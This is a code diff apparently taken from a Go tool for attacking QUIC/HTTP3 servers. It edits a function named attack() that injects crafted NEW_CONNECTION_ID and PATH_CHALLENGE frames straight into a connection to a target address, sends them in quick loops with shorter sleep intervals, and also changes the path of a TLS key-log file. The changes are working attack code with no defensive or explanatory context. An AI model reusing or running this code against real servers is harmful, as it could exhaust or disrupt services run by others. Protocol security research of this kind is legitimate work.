@@ -66,7 +66,8 @@ func main() {
 	//go func() { log.Fatal(echoServer()) }()
 
 	//keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
-	keyLogFile := "/home/john/Desktop/cjj_related/key.log"
+	//keyLogFile := "/home/john/Desktop/cjj_related/key.log"
+	keyLogFile := "key.log"
 	//keyLogFile := "/mnt/hgfs/work/key.log"
 
 	if len(keyLogFile) > 0 {
@@ -370,8 +371,20 @@ func attack(connectAddr, targetAlpn string, wg *sync.WaitGroup) (response *HTTPM
 	pingFrame := []wire.Frame{
 		ping_frame,
 	}
+	var nci_frames []wire.Frame
+	for j := 10; j < 11; j++ {
+		ConnectionID, _ := protocol.GenerateConnectionIDForInitial()
+		new_CID := &wire.NewConnectionIDFrame{
+			SequenceNumber: uint64(j),
+			//RetirePriorTo:  uint64(1),
+			ConnectionID: ConnectionID,
+			//StatelessResetToken: protocol.StatelessResetToken{0xe, 0xd, 0xc, 0xb, 0xa, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0},
+		}
+		nci_frames = append(nci_frames, new_CID)
+	}
+	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(nci_frames)
 
-	//time.Sleep(time.Second)
+	time.Sleep(time.Millisecond * 10)
 	for i := 0; i < 10; i++ {
 		if i%100 == 0 && i != 0 {
 			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(pingFrame)
@@ -383,14 +396,6 @@ func attack(connectAddr, targetAlpn string, wg *sync.WaitGroup) (response *HTTPM
 		padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
 		padding = []byte("")
 		//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
-		ConnectionID, _ := protocol.GenerateConnectionIDForInitial()
-		new_CID := &wire.NewConnectionIDFrame{
-			SequenceNumber: uint64(10),
-			//RetirePriorTo:  uint64(1),
-			ConnectionID: ConnectionID,
-			//StatelessResetToken: protocol.StatelessResetToken{0xe, 0xd, 0xc, 0xb, 0xa, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0},
-		}
-		new_CID = new_CID
 
 		path_challengeFrame := &wire.PathChallengeFrame{
 			Data:    randomBytesArray,
@@ -401,7 +406,7 @@ func attack(connectAddr, targetAlpn string, wg *sync.WaitGroup) (response *HTTPM
 			//new_CID,
 		}
 		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
-		time.Sleep(time.Millisecond * 100)
+		time.Sleep(time.Millisecond * 10)
 	}
 
 	time.Sleep(time.Millisecond * 500)
